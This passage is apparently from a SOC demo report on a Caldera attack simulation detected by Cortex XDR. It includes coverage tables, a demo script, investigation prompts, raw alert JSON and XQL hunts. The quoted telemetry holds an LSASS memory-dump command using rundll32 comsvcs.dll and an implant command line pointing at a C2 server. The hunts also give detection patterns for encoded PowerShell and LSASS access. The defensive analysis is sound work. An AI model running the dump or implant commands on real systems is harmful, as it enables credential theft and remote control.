**This is the alert-fatigue story** in concrete numbers: 40 alerts for 1 attacker action. The demo can use this to anchor the "AgentiX/AI consolidates 75 alerts into 18 unique behavioral patterns" value proposition. The signature engine is doing its job correctly — the suppression layer is what AgentiX adds.

### 8.6 Caldera "failures" that XDR caught anyway

Of the 5 Caldera abilities flagged FAIL in operation 89644a10:
- T1548.002 Fodhelper UAC bypass → XDR caught it (Detection 11)
- T1136.001 New-LocalUser → XDR caught it (Detection 14)
- T1560 Compress-Archive → XDR has no specific detection for this (no alert)

**3 of 5 "failed" Caldera steps still produced XDR-visible detections.** Caldera's verdict reflects whether the side-effect of the ability VERIFIED, not whether the Windows telemetry ARTIFACT generated. XDR detects on the artifact side.

### 8.7 The MITRE T1574.002 labeling misread

The Detection 1 "File Drop" alert is labeled T1574.002 DLL Side-Loading. This is **NOT** because the dropped file is a `.dll`. It's because XDR's signature `2554896526` is curated as part of a known DLL-side-loading toolkit family — the MITRE label describes the toolkit's typical use, not the literal file extension.

Both this AI investigator (initially) and the human operator misread this on first pass — they expected to find a `.dll` in the causality view and instead found `resultsreport.exe`. **This is a teaching moment for the demo**: MITRE labels in XDR describe adversary INTENT inferred from the indicator, not artifact TYPE.

For the demo, the corrected narrative is: PowerShell dropped `resultsreport.exe`. XDR's signature engine recognized the hash family as part of a DLL-side-loading toolkit (the kind of attack the toolkit usually enables). MITRE-labeled it T1574.002 accordingly. The same file fires WildFire's verdict 27 minutes later.

---

## 9. Detection Coverage Analysis (per MITRE technique in the 20-step chain)

For each of the 20 Caldera abilities, did XDR detect it?

| Caldera step | MITRE | Caldera result | XDR detection? | Detection name(s) |
|---|---|---|---|---|
| 1. Phishing implant | T1566.001 | OK | **Yes** | Detection 1 File Drop + Detection 18 WildFire |
| 2. Cmd writes script | T1059.003 | OK | Yes (folded into Detection 3) | Script Activity |
| 3. Account + Sys Discovery | T1087.001 | OK | (no specific alert — XDR didn't fire on whoami/Get-LocalUser alone) | — |
| 4. Sys+Net Burst | T1082 | OK | Partial — folded into Detection 4 base64 recon | Powershell Activity |
| 5. Network Share Discovery | T1135 | OK | (no specific alert) | — |
| 6. Cached Cred Cmdkey | T1003.005 | OK | (no specific alert — cmdkey alone doesn't fire) | — |
| 7. **LSASS dump** | T1003.001 | OK | **Yes ×3 layers** | Detection 6 + 7 + 8 + 9 + 10 |
| 8. Fodhelper UAC bypass | T1548.002 | **FAIL** | **Yes** | Detection 11 |
| 9. Disable Defender | T1562.001 | OK | (no specific alert in case 1872) | — |
| 10. certutil decode | T1140 | OK | **Yes** | Detection 13 |
| 11. New local user | T1136.001 | **FAIL** | **Yes** | Detection 14 |
| 12. Registry Run key | T1547.001 | OK | Yes — folded into Detection 16 autorun | Powershell Activity (T1112) |
| 13. Scheduled task | T1053.005 | OK | Yes | Detection 17 |
| 14. **Lateral SMB+WMI+WinRM** | T1021.002 | OK | **No specific lateral movement alert in case 1872** ⚠ |
| 15. Automated collection | T1119 | OK | (no specific alert) | — |
| 16. Compress-Archive | T1560 | **FAIL** (partial) | (no specific alert) | — |
| 17. DNS C2 | T1071.004 | OK | (no specific alert) | — |
| 18. HTTP POST exfil | T1041 | OK | (no specific alert in case 1872) | — |
| 19. Ransom note write | T1491 | OK | (no specific alert) | — |
| 20. **Security event log clear** | T1070.001 | OK | **(no detection seen in case 1872)** ⚠ |

### 9.1 Detection gaps worth surfacing

⚠ **Two notable gaps**:

1. **T1021.002 SMB lateral movement** — the chain explicitly fires this (step 14), but no lateral movement alert appears in case 1872 within the observed time window. Two possible explanations:
   - The lag in XDR's network-side correlation produced an alert AFTER the case modification window (08:19:11 UTC). A later check might find it.
   - XDR's lateral-movement detection rules (e.g., "Abnormal SMB activity to multiple hosts") require a baseline that wasn't built in this lab environment.

2. **T1070.001 Security event log clear** — even though the simulation's documentation guarantees Event ID 1102 fires unconditionally on `wevtutil cl Security`, no corresponding XDR alert appears in case 1872. Possible explanations: either XDR's Security 1102 correlation rule isn't enabled in this tenant, or the case had already been "closed for additions" at the time the event fired.

These gaps are **valuable demo content** — they let you talk about coverage realistically rather than as a perfect-detection fairy tale.

### 9.2 Detection coverage by tactic

| Tactic | Caldera fired N techniques | XDR caught N | Coverage |
|---|---|---|---|
| Initial Access (TA0001) | 1 (T1566.001) | 1 (via Detection 1 + 18 — file drop signature + WildFire) | 100% |
| Execution (TA0002) | 3 (T1059.001, T1059.003, T1086) | 3 (Detections 3, 4, 5, 8, 9, 15, 17) | 100% |
| Persistence (TA0003) | 4 (T1136.001, T1547.001, T1053.005, T1098) | 3 (Detections 14, 16, 17 — T1098 + T1112 + T1059.001) | 75% |
| Privilege Escalation (TA0004) | 1 (T1548.002) | 1 (Detection 11) | 100% |
| Defense Evasion (TA0005) | 3 (T1562.001, T1140, T1070.001) | 1 (Detection 13 — T1140 only) | 33% — Defender disable + log clear missed |
| Credential Access (TA0006) | 2 (T1003.001, T1003.005) | 1 (T1003.001 via Detections 6+7+8+9+10) | 50% — cmdkey not caught |
| Discovery (TA0007) | 4 (T1087.001, T1082, T1018, T1135) | 0 specific detections (folded into recon Powershell Activity) | partial |
| Lateral Movement (TA0008) | 1 (T1021.002) | 0 ⚠ | 0% — gap |
| Collection (TA0009) | 2 (T1119, T1560) | 0 | 0% — gap |
| C2 (TA0011) | 1 (T1071.004) | 0 | 0% — gap |
| Exfiltration (TA0010) | 1 (T1041) | 0 | 0% — gap |
| Impact (TA0040) | 1 (T1491) | 0 | 0% — gap |

**Honest summary**: XDR has strong signal-based coverage on the early/mid kill chain (Initial Access through Privilege Escalation through Persistence — almost everything caught). Coverage thins out for later-stage tactics (Lateral Movement, Collection, C2, Exfiltration, Impact). This is a **realistic and demo-worthy finding** — no detection product catches every tactic equally.

---

## 10. Operator Observations During the Live Run

The human SOC analyst (Ayman) made the following real-time observations while watching the simulation, which are valuable for understanding how a SOC operator's intuition diverges from machine-derived findings.

### 10.1 "How much steps we have left?" (mid-run, ~step 14)

Triggered a side-channel verification via direct Caldera REST API — bypassing Phantom Agent's narration which lags 2-4 abilities behind reality (by design — the `caldera_wait_for_operation_progress` tool only re-emerges from its server-side blocking loop on meaningful state changes). Confirmed: 30 of 40 abilities terminal, 10 to go, 4 in FAIL status.

**Lesson**: real-time orchestrators trade narrative precision for LLM cost — the agent burns <8 turns to narrate the whole chain instead of 40+. The trade-off is acceptable, but the SOC analyst should know the lag exists.

### 10.2 "I don't see any lateral movement issues fired on XDR yet, is it normal?"

Asked ~3 minutes after the T1021.002 lateral SMB step completed in Caldera. Verified via direct cortex-xdr connector query: at that moment, no lateral movement alert existed in case 1872. Explanation: XDR's lateral movement detections often have higher correlation latency (depend on multi-event correlation) than signature-based detections.

The gap persisted through the end of the observation window. Documented in §9.1 as a detection gap worth surfacing.

### 10.3 "I couldn't find any DLL while looking at the causality chain"

Asked after reviewing my (initially incorrect) narrative that the dropped file was a DLL. Investigation revealed: the file is `resultsreport.exe`, an executable, not a `.dll`. The MITRE T1574.002 label is the SIGNATURE engine's threat-intel classification (toolkit family known for DLL side-loading), not a description of the file's extension. **The operator's instinct to verify the artifact against the label caught an interpretation error** — both in the AI's narrative AND in how a junior analyst might read the case.

### 10.4 "I want to switch focus to run another simulation"

Prior context: this simulation was the second of two prompts the operator tested in one session. The first prompt (a phishing→cloud-takeover scenario via xlog/xsiam) failed prereq check because xlog isn't configured in this lab. The operator pivoted to a Caldera+XDR+Cortex-Docs trio that works with currently-available instances. Result: the simulation ran end-to-end successfully — confirming the value of prompt-engineering for what's available, not what's documented.

---

## 11. Recommended Demo Flow

### 11.1 The best alert to start with

**Open the demo on Issue #6 — `Lsass Dump Attempt - 773095356`** (alert_id 40970, 2026-05-19 08:11:04 UTC on xdragent).

Why this one, not the chronologically first File Drop alert:
- It's the **narrative inflection point** — the moment reconnaissance becomes credential theft
- It pivots both UP (causality view shows PowerShell ancestor → BITS, recon, file drop) AND DOWN (Mimikatz cascade, UAC bypass, persistence triplet, eventual WildFire verdict)
- The single rundll32+comsvcs.dll command line is a famous LOLBin pattern that demo audiences recognize instantly
- It has rich forensic data: file path, PID, dump type, dump file location, multi-layer detection convergence
- High severity, zero false-positive risk

### 11.2 Recommended narrative arc

```
START: Open Issue #6 (LSASS Dump Attempt) ── 30s introduction
   ↓
[UPWARD: walk back through causality]
   View Causality on Issue #6 → see powershell.exe parent
   Then: BITS stage (Detection 2) ── Recon (Detection 4) ── Script Engine (Detection 5)
   Stop at: Detection 1 (File Drop on resultsreport.exe at 07:50:59)
   "This is where it started — but watch what hasn't happened yet"

[CONTEXT: time gap callout]
   "Sixteen minutes of silence between the drop and the next activity"
   "Patient adversary, paced operation"

[INFLECTION: return to LSASS]
   Show Detection 6 + 7 + 8 + 9 (the triple-layer convergence)
   Show the 42 Mimikatz alerts in 21 seconds — the alert-fatigue moment
   Open Forensics Highlights → show lsass-141987479.dmp file artifact

[CASCADE: post-credential-theft]
   UAC bypass (Detection 11) ── certutil decode (Detection 13)
   New local user (Detection 14 — open the XDR BIOC rule definition, show the regex pattern)
   Autorun reg + scheduled task (Detections 16 + 17)

[CLOSING: WildFire verdict]
   Show Detection 18 — open the alert
   Reveal: action_file_path = C:\Users\Public\resultsreport.exe
   "That's the SAME file from Detection 1, 27 minutes later"
   "Two engines. Two verdicts. One file. The chain closes."

[FINAL: parallel-execution reveal]
   Switch back to case overview
   Show: every detection has a twin on xdragent2 with sub-minute lag
   "The attacker had cross-host capability BEFORE we saw the first alert"

END: AgentiX prompts (see §12)
```

Estimated demo time: **12-15 minutes** for a technical audience, **8-10 minutes** for a CISO-level audience.

### 11.3 Pacing variations

| Audience | Length | Skip |
|---|---|---|
| **CISO / executive** | 8 min | Skip the BIOC rule definition deep-dive in Detection 14. Skip MITRE labeling nuance. Focus on detection convergence + the 42-alerts-from-one-action point. |
| **SOC manager** | 12 min | Include BIOC rule definition. Include MITRE labeling discussion. Include detection coverage gap (lateral movement, event log clear). |
| **IR / threat hunter** | 18 min | Add the XQL hunt prompt (AgentiX prompt 4). Add the polymorphic payload hash divergence. Add Operator Observations §10.1-§10.3 as live audience moments. |

### 11.4 Speaker copy for each major beat

#### Step 1 (Detection 1 — File Drop)

> "At 07:50:59 UTC, XDR fires a 'File Drop - 2554896526' alert on xdragent. Same alert fires on xdragent2 twenty-one seconds later. What happened: PowerShell wrote C:\Users\Public\resultsreport.exe — an executable, not a DLL — and XDR's signature engine recognized the hash family instantly. The MITRE label says T1574.002 DLL Side-Loading; that's because the signature ID maps to a hash family curated as part of a known DLL-side-loading toolkit. MITRE in XDR describes the technique the indicator enables, not the file's extension. Hold onto that filename — `resultsreport.exe`. WildFire is going to confirm it as malware twenty-seven minutes from now."

#### Step 5/6 (Detection 6 — LSASS Dump, the inflection point)

> "Here's where everything changes. At 08:11:04, XDR fires 'Lsass Dump Attempt - 773095356' on xdragent. The command line tells the whole story: `rundll32.exe comsvcs.dll, MiniDump 856 C:\Windows\Temp\lsass-141987479.dmp full`. Translation: the attacker is using the legitimate Windows utility rundll32 to invoke a built-in DLL function called MiniDump against process ID 856 — which is LSASS — and writing the entire memory image to disk. That's textbook credential dumping using only signed Windows binaries. No malware needed.
>
> Watch what XDR does in the same second: signature engine fires, behavioral BIOC fires on the .dmp file being written, and the mimikatz signature variant fires forty times as the dumper reads through LSASS memory regions. Three independent detection engines, one second, one event. That's the convergence story."

#### Step 14 (Detection 18 — WildFire verdict, the chain closure)

> "Twenty-seven minutes after that file dropped at 07:50, WildFire's cloud sandbox finishes detonating it and returns its verdict — malicious. Action file path: C:\Users\Public\resultsreport.exe. Same path. Same file. Different engine. The signature engine caught it instantly; the cloud sandbox confirmed it methodically. That's defense in depth in action.
>
> One more thing — the SHA256 hashes on the two hosts are different. Same filename, same role, different binary. That's polymorphic delivery — each host got a uniquely-compiled implant. A hash-only blocklist wouldn't have caught the second host. But XDR clustered both detections into this single case because the BEHAVIOR fingerprint matches. That's how modern detection should work."

---

## 12. AgentiX Investigation Prompts (5 fresh prompts for the Case Investigation Agent)

These are designed to showcase Cortex AgentiX's agentic AI investigation capabilities on case 1872. Each prompt exercises multi-step reasoning that humans can't do at machine speed.

### Prompt 1 — Causality reconstruction + attacker-objective inference

> Walk through the causality chain for the LSASS dump alert at 08:11:04 on `xdragent` (alert_id 40970). Trace UPWARD to find what process initiated PowerShell and what command-line arguments preceded the `rundll32 comsvcs.dll` invocation. Trace DOWNWARD to find what the attacker did with the dumped credentials — did they use them to authenticate elsewhere, or just leave the .dmp on disk? Then tell me, based on the full causality pattern: what's the attacker's likely end-goal — financial fraud, ransomware staging, espionage, or destructive impact? What phase are they currently in: initial access, expansion, action-on-objectives, or covering tracks?

### Prompt 2 — Detection coverage gap analysis

> List every detection rule that fired on case 1872, grouped by source (XDR Agent / XDR BIOC / XDR Analytics BIOC / WildFire) and by MITRE tactic. Then answer two questions: (1) Which techniques in this kill chain were caught ONLY by signature (XDR Agent) and would have been missed if the attacker had used custom tooling? (2) Looking at the ATT&CK ransomware playbook, which techniques are missing from this case that a real attacker would normally execute next — and would our current XDR coverage catch them if they did?

### Prompt 3 — Cross-host lateral movement timeline

> Case 1872 spans `xdragent` and `xdragent2`. Build a side-by-side timeline of the equivalent detections firing on both hosts. For each detection type, report the lag between the first occurrence on `xdragent` vs. on `xdragent2`. Then assess: is the lag consistent with active lateral movement (the attacker is running each step manually on each host), simultaneous-but-independent compromise (both hosts hit at the same time from outside), or remote-execution batch (one host launched everything on the other via WMI/SMB/WinRM)? Cite specific evidence — process command lines, file timestamps, or network connections — that supports your hypothesis.

### Prompt 4 — XQL hunt: pre-attack reconnaissance window

> Generate an XQL query for the 4-hour window BEFORE the earliest alert in case 1872 (so 03:50:59 → 07:50:59 UTC on 2026-05-19), searching `xdr_data` for evidence of how the attacker got initial access on `xdragent` and `xdragent2`. Look for: (a) process executions referencing `\Users\Public\`, (b) any PowerShell with `-EncodedCommand` or `-enc` flags, (c) outbound network connections to non-corporate IPs from `wmiprvse.exe`, `mmc.exe`, `taskhostw.exe`, or any `Office\WINWORD.exe`/`EXCEL.exe`/`OUTLOOK.exe` spawning `cmd.exe`/`powershell.exe`. Show me the XQL, then run it, and tell me what the lead-in to this attack looked like.

### Prompt 5 — Containment + recovery action plan with business-impact ranking

> Given the 18 detection types in case 1872 and the user `ayman` being involved across both hosts: produce a 5-step containment plan. For each step, give me: (a) the specific XDR action to take (host isolation, terminate process tree, delete file, block hash, revoke credential), (b) the business disruption it causes (none / low / medium / high), and (c) the residual risk if I skip it. Rank the steps by **risk reduction per unit of disruption** — the operator on call needs to know which two actions to take RIGHT NOW that maximally reduce risk with minimum impact. Finally: identify which credentials need to be rotated based on the LSASS dump evidence (assume the dump was successful even if the process was killed).

---

## 13. Demo Assets

| Asset | Path | Purpose |
|---|---|---|
| **Animated kill chain diagram** | `docs/demo/case_1872_killchain.svg` | 1920×1080 self-contained SVG. Open in any browser; plays automatically (~17s sequence). Two parallel host swimlanes, 11 step nodes per lane, color-coded by MITRE tactic, with inflection-point callout on the LSASS dump and Mimikatz particle burst. |
| **Static end-state poster** | `docs/demo/case_1872_killchain_t18s.png` | 1920×1080 PNG of the diagram's final state. Drop directly into a slide. |
| **Mid-animation snapshot (Mimikatz burst peak)** | `docs/demo/case_1872_killchain_t8s_burst.png` | 1920×1080 PNG of the Mimikatz particle burst peaking. |
| **Eight timeline keyframes** | `docs/demo/frame_t{3500,5000,7000,8000,9500,12000,14000,18000}.png` | Eight 1920×1080 PNGs spaced across the animation timeline. Sequence as a multi-slide reveal for a manually-controlled demo pace. |
| **This report** | `docs/demo/case_1872_simulation_report.md` | Source-of-truth for everything in this case. |

---

## 14. Caveats and Open Items

| Item | Status | What to verify before demoing |
|---|---|---|
| Lateral movement (T1021.002) detection gap | Open | Worth checking 24-48h after this snapshot whether XDR's network-side correlation eventually surfaced a lateral movement alert on case 1872. If yes, update §9.1. |
| Security event log clear (T1070.001) detection gap | Open | Verify whether XDR's tenant has the Security 1102 correlation rule enabled. If not, this is a tenant config gap, not an XDR capability gap. |
| The `LSASS dump file written to disk` Analytics BIOC firing on ONLY xdragent | Open | The dump fires on both hosts but the BIOC alert appears only for xdragent. Possibly a different file path on xdragent2 (the dump file name is randomized by PID), possibly a correlation-engine lag. Worth a follow-up query. |
| Mimikatz signature count discrepancy | Verified | Detection 9 fires 40 times across both hosts; the section "MITRE technique frequency" reports 42 for T1555 because Detection 9 (40) + Detection 10 (2) = 42 alerts under that technique label. |
| The "DLL side-loading" label correctness | Verified — corrected | Initial AI narrative incorrectly called the dropped file a DLL. Verified via XDR action_file_path on the WildFire alerts: file is `resultsreport.exe`. Report and demo speaker copy updated. |
| Causality view UX limitation for File Drop alerts | Verified | XDR Agent's File Drop signature alerts don't expose `action_file_path` in the alert envelope. To find the dropped file's path, use one of: the corresponding WildFire alert's `action_file_path`, the causality graph drilldown, Forensics Highlights tab, or an XQL hunt. |
| Polymorphic hash divergence between hosts | Verified | xdragent and xdragent2 each got a different `resultsreport.exe` binary (different SHA256, different MD5). Consistent with Caldera's per-agent build behavior — accurately models real adversary polymorphism. |
| Case 1872 may continue receiving new issues | Open | XDR appends new issues to existing cases that match the threat-cluster fingerprint. If future Caldera runs trigger the same patterns, case 1872 will grow. For any demo, capture a snapshot of the case at a known time and reference it as "case state at [timestamp]". |

---

## 15. Appendix A — Sample XDR API responses (raw data verification)

### A.1 Case header (from xdr_get_cases_and_issues, incident_id=1872)

```json
{
  "incident_id": "1872",
  "incident_name": "'File Drop - 2554896526' along with 74 other issues",
  "description": "'File Drop - 2554896526' along with 74 other issues generated by XDR Agent, XDR Analytics BIOC and XDR BIOC detected on 2 hosts involving 3 users",
  "severity": "high",
  "status": "new",
  "creation_time": 1779177072000,
  "modification_time": 1779178751000,
  "alert_count": 75,
  "hosts": ["AGENT_OS_WINDOWS:xdragent", "AGENT_OS_WINDOWS:xdragent2"],
  "users": ["ayman", "xdragent\\ayman", "xdragent2\\ayman"]
}
```

### A.2 LSASS dump file BIOC alert (Detection 7, alert_id=40971)

```json
{
  "alert_id": "40971",
  "name": "LSASS dump file written to disk",
  "severity": "medium",
  "category": "Credential Access",
  "source": "XDR Analytics BIOC",
  "detection_timestamp": 1779178264000,
  "host_name": "xdragent",
  "host_ip": "10.10.0.14",
  "user_name": "XDRAGENT\\ayman",
  "mitre_technique_id_and_name": "T1003 - OS Credential Dumping",
  "mitre_tactic_id_and_name": "TA0006 - Credential Access",
  "causality_actor_process_image_name": "powershell.exe",
  "actor_process_image_name": "rundll32.exe",
  "actor_process_command_line": "rundll32.exe  C:\\Windows\\System32\\comsvcs.dll, MiniDump 856 C:\\Windows\\Temp\\lsass-141987479.dmp full",
  "action_file_name": "lsass-141987479.dmp",
  "action_file_path": "C:\\Windows\\Temp\\lsass-141987479.dmp",
  "description": "Dumping Lsass.exe (Local Security Authority Subsystem Service) memory to file allows attackers to later extract credentials from the memory dump"
}
```

### A.3 WildFire verdict alert (Detection 18, alert_id=41036)

```json
{
  "alert_id": "41036",
  "name": "WildFire Malware",
  "severity": "high",
  "category": "Malware",
  "source": "XDR Agent",
  "detection_timestamp": 1779178676000,
  "host_name": "xdragent",
  "action_file_name": "resultsreport.exe",
  "action_file_path": "C:\\Users\\Public\\resultsreport.exe",
  "action_file_sha256": "70dc0340bc755ed309cef4865a88827c8aa597212a49e40670c430cd82b4e171",
  "actor_process_image_name": "resultsreport.exe",
  "actor_process_image_path": "C:\\Users\\Public\\resultsreport.exe",
  "actor_process_command_line": "\"C:\\Users\\Public\\resultsreport.exe\" -server http://10.10.0.81:8888 -group red",
  "actor_process_image_md5": "7acec55a87b81833bdde1ef0d5a5e326",
  "actor_process_image_sha256": "70dc0340bc755ed309cef4865a88827c8aa597212a49e40670c430cd82b4e171",
  "causality_actor_process_image_name": "powershell.exe",
  "causality_actor_process_image_sha256": "38f4384643b3fa0de714d2367b712c2e0fa1c89e2cfd131ae6b831ad962b1033",
  "description": "Suspicious executable detected"
}
```

---

## 16. Appendix B — XQL queries the demo can run live

### B.1 Find all alerts in case 1872 grouped by detection name

```xql
preset = xdr_alerts
| filter incident_id = 1872
| comp count() as alert_count by name, source, mitre_technique_id_and_name
| sort desc alert_count
```

### B.2 Find every event involving `resultsreport.exe` across the case time window

```xql
dataset = xdr_data
| filter _time >= to_epoch(parse_timestamp("%Y-%m-%dT%H:%M:%S", "2026-05-19T07:50:00")) * 1000
| filter _time <= to_epoch(parse_timestamp("%Y-%m-%dT%H:%M:%S", "2026-05-19T08:20:00")) * 1000
| filter action_file_path contains "resultsreport.exe" or actor_process_image_path contains "resultsreport.exe"
| fields _time, event_type, host_name, actor_process_image_name, action_file_path, action_file_sha256
| sort asc _time
```

### B.3 Find the pre-attack reconnaissance window (4 hours before first alert)

```xql
dataset = xdr_data
| filter _time >= to_epoch(parse_timestamp("%Y-%m-%dT%H:%M:%S", "2026-05-19T03:50:00")) * 1000
| filter _time <  to_epoch(parse_timestamp("%Y-%m-%dT%H:%M:%S", "2026-05-19T07:50:00")) * 1000
| filter host_name in ("xdragent", "xdragent2")
| filter actor_process_image_name in ("powershell.exe", "cmd.exe", "wmiprvse.exe", "mmc.exe")
| filter actor_process_command_line contains "-EncodedCommand"
   or actor_process_command_line contains "-enc"
   or action_file_path contains "\\Users\\Public\\"
| fields _time, host_name, actor_process_image_name, actor_process_command_line, action_file_path
| sort asc _time
```

### B.4 Find every LSASS handle access (broader than the case)

```xql
dataset = xdr_data
| filter event_type = ENUM.PROCESS
| filter action_process_image_name = "lsass.exe"
| filter actor_process_image_name in ("rundll32.exe", "procdump.exe", "mimikatz.exe", "powershell.exe", "taskmgr.exe")
| comp count() as access_count by host_name, actor_process_image_name
| sort desc access_count
```

---

## 17. Glossary (for non-XDR audience members)

| Term | Definition |
|---|---|
| **BIOC** | "Behavioral Indicators of Compromise" — analyst-authored declarative rules in XDR that fire on event-stream patterns (e.g., "any powershell.exe with command line containing `New-LocalUser` is suspicious"). |
| **Analytics BIOC** | ML-built behavioral rules that XDR generates automatically by learning from event data, as opposed to analyst-authored BIOCs. |
| **Causality View** | XDR's interactive process-tree visualization that shows the parent-child relationships of every process involved in an alert, plus their file writes, network connections, and registry changes. |
| **Causality Group Owner (CGO)** | The "root cause" process in a causality chain — typically a long-lived legitimate process that started the chain. |
| **Causality Actor Process (CAP)** | The trusted process that's directly responsible for the bad action (often the legitimate signed binary that was abused — e.g., powershell.exe). |
| **Forensics Highlights** | XDR's per-host summary of high-fidelity forensic artifacts: files created, registry changes, network endpoints contacted, etc. |
| **Live Terminal** | XDR's read-only / read-write shell access to a managed endpoint, used during investigation to verify artifacts in-place. |
| **LOLBin** | "Living Off the Land Binaries" — legitimate Windows utilities abused for malicious purposes (rundll32, certutil, mshta, wmiprvse, etc.). |
| **MITRE ATT&CK** | The community-curated framework for cataloging adversary techniques (e.g., T1003.001 = OS Credential Dumping: LSASS Memory). |
| **WildFire** | Palo Alto Networks' cloud sandbox service for dynamic file analysis. Detonates files in an isolated VM, observes behavior, returns verdict. Used as the "second opinion" engine in XDR. |
| **XDR Agent** | The endpoint sensor that runs on every protected machine. Captures kernel-level telemetry, runs signature engines locally, ships events to XDR cloud. |
| **XQL** | Cortex Query Language — XDR's SQL-like syntax for ad-hoc querying of the underlying xdr_data event lake. |

---

*Report ends. See `docs/demo/case_1872_killchain.svg` for the animated visual companion; see `docs/demo/case_1872_killchain_t18s.png` for the static poster version.*
